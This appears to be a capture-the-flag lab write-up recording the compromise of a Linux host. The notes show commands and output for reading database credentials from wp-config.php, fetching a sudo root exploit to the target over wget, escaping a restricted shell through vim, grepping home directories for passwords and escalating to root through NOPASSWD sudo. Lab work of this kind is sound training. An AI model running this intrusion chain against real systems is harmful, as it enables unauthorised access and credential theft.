Upload and exec LinPEAS.

Interesting Results:
```
Sudo version 1.8.31 

[...]

Analyzing Wordpress Files (limit 70)
-rwxr-xr-x 1 www-data www-data 2898 Feb 18  2021 /var/www/html/wordpress/wp-config.php                                                                                                                                                      
define( 'DB_NAME' 'wordpress' );
define( 'DB_USER', 'margaret' );
define( 'DB_PASSWORD', 'Welcome1!2@3#' );
define( 'DB_HOST', 'localhost' );
```
=> `margaret:Welcome1!2@3#`

---
# Sudo

Same sudo version as on Host 10.10.110.100:
```bash
# Download on kali
git clone https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit.git
# Zip the git project in order to upload it to the target
zip -r exploit.zip Sudo-1.8.31-Root-Exploit
# Upload to target
wget http://10.10.14.58/exploit.zip

# On target:
unzip exploit.zip
cd Sudo-1.8.31-Root-Exploit/
make
./exploit
```
=> Doesn't work this time :(

---
# SSH

```bash
ssh -J balthazar@10.10.110.100:22 margaret@172.16.1.10
# TheJoker12345!
# Welcome1!2@3#
```

# Restricted Shell Escape

Margaret uses a restricted lshell. Breakout via VIM as enumerate via LFI vuln:
```lshell
vim -c ':!/bin/bash'
```
=> denied

VIM Escape:
```
:set shell=/bin/sh
:shell
```
=> BINGO!

Spawn bash:
```bash
bash

cat flag.txt
# DANTE{LF1_M@K3s_u5_lol}
```

# MySQL

```bash
mysql -h localhost -u "margaret" -P 3306 -p
mysql -h localhost -u "margaret" -P 33060 -p
# Welcome1!2@3#

mysql -h localhost -u "frank" -P 3306 -p
mysql -h localhost -u "frank" -P 33060 -p
# TractorHeadtorchDeskmat
```
=> nope

# Credential Search

```bash
find /home/ -type f -exec grep --color=auto -inw 'PASSWORD' {} + 2>/dev/null
# /home/margaret/.config/Slack/exported_data/secure/2020-05-18.json
```
Creds:
- User/PW: `TractorHeadtorchDeskmat:TractorHeadtorchDeskmat`
- PW: `STARS5678FORTUNE401`

# User frank

One of the passwords works for frank:
```bash
su frank
# TractorHeadtorchDeskmat
```

SSH as frank:
```bash
ssh -J balthazar@10.10.110.100:22 frank@172.16.1.10
# TheJoker12345!
# TractorHeadtorchDeskmat
```

# Credentials Search as frank

```bash
find /home/ -type f -exec grep --color=auto -inw 'PASSWORD' {} + 2>/dev/null
# /home/frank/Downloads/Test Workspace Slack export May 17 2020 - May 18 2020/secure/2020-05-18.json
```
Creds:
- User/PW: `69F15HST1CX:69F15HST1CX`

# Sudo privs

```bash
sudo -l

User frank may run the following commands on localhost:
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
```

Root shell:
```bash
sudo su

root@DANTE-NIX02:/home/frank# id
uid=0(root) gid=0(root) groups=0(root)
```